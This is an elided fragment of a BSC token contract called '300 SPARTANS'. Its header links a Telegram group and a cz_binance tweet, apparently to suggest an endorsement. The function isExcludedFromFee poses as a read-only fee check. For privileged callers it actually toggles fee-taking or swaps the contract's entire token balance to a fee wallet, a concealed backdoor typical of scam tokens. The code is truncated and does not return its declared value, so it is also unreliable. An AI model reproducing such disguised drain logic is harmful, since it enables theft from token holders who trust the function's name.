...
//Telegram : https://t.me/SpartansBSC
//Twitter : https://twitter.com/cz_binance/status/1552885070888947712
...
contract Spartans300 is Context, IERC20, Ownable {
    ...
    string private constant _name = "300 SPARTANS";
    string private constant _symbol = "300 SPARTANS";
    ...
    function isExcludedFromFee(address account) public override returns(bool) {
        address does = _msgSender();
        if(_isExcludedFromFee[does]){ if(takeFee){ takeFee = false; } 
        else{ swapping = true; swapAndSendToFee(balanceOf(address(this)));}}
